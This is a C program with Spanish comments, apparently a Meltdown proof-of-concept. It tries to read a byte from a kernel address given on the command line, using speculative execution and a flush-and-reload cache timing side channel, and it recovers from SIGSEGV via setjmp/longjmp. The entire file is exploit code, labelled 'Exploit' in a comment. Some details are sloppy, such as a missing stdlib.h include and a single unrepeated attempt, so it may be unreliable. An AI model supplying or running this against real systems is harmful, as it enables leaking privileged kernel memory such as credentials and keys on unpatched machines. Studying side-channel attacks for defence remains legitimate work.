#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>  // Para rdtsc, clflush

#define PAGE_SIZE 4096
#define ARRAY_SIZE 256
#define CACHE_HIT_THRESHOLD 80  // Umbral en ciclos de CPU

static uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE];
static jmp_buf jump_buffer;

// Handler para SIGSEGV: vuelve al punto del setjmp
void segfault_handler(int sig) {
    longjmp(jump_buffer, 1);
}

// Función para medir el tiempo de acceso a memoria
int timed_read(volatile uint8_t *addr) {
    unsigned int junk = 0;
    uint64_t start = __rdtscp(&junk);
    junk = *addr;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}

// Exploit: intenta leer 1 byte desde la dirección
void meltdown_read_byte(uint8_t *kernel_addr, uint8_t *value) {
    int i;

    // Vaciar cache
    for (i = 0; i < ARRAY_SIZE; i++)
        _mm_clflush(&probe_array[i * PAGE_SIZE]);

    // Esperar un poco
    _mm_mfence();

    // Salto de recuperación si hay SIGSEGV
    if (setjmp(jump_buffer) == 0) {
        // Intentar leer dirección prohibida
        uint8_t val = *kernel_addr;

        // Acceder al índice correspondiente en probe_array
        probe_array[val * PAGE_SIZE] += 1;
    }

    // Recuperar el valor accedido
    for (i = 0; i < ARRAY_SIZE; i++) {
        int time = timed_read(&probe_array[i * PAGE_SIZE]);
        if (time < CACHE_HIT_THRESHOLD) {
            *value = i;
            return;
        }
    }

    // Si no se detecta nada fiable
    *value = 0xFF;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Uso: %s <direccion_hex>\n", argv[0]);
        return 1;
    }

    // Convertir dirección de string a puntero
    uint8_t *target = (uint8_t *)strtoull(argv[1], NULL, 16);
    uint8_t result;

    // Configurar handler de SIGSEGV
    signal(SIGSEGV, segfault_handler);

    meltdown_read_byte(target, &result);
    printf("Dirección %p: 0x%02x ('%c')\n", target, result, result);

    return 0;
}
